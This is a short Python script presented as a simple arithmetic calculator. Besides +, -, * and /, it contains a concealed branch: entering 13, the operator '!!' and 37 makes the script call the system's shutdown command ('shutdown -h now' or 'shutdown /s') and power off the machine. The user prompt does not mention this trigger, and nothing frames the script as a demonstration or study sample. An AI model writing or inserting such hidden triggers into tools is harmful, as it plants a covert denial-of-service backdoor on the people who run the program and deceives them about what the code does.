
import os
import platform

# Define a function for performing basic arithmetic operations
def calculate(num1, operator, num2):
    if operator == "+":
        return num1 + num2
    elif operator == "-":
        return num1 - num2
    elif operator == "*":
        return num1 * num2
    elif operator == "/":
        return num1 / num2
    # Check if the user entered the secret code to shut down the system
    elif num1 == 13 and operator == "!!" and num2 == 37:
        # Get the current operating system
        current_os = platform.system()
        if current_os == "Linux" or current_os == "Darwin":
            # Use the "shutdown" command with the "-h" flag to shut down and power off
            os.system("shutdown -h now")
        elif current_os == "Windows":
            # Use the "shutdown" command with the "/s" flag to shut down and power off
            os.system("shutdown /s")
    else:
        return "Invalid input"

# Prompt the user for input
num1 = float(input("Enter the first number: "))
operator = input("Enter the operator (+, -, *, /): ")
num2 = float(input("Enter the second number: "))

# Perform the calculation and print the result
result = calculate(num1, operator, num2)
print("The result is:", result)



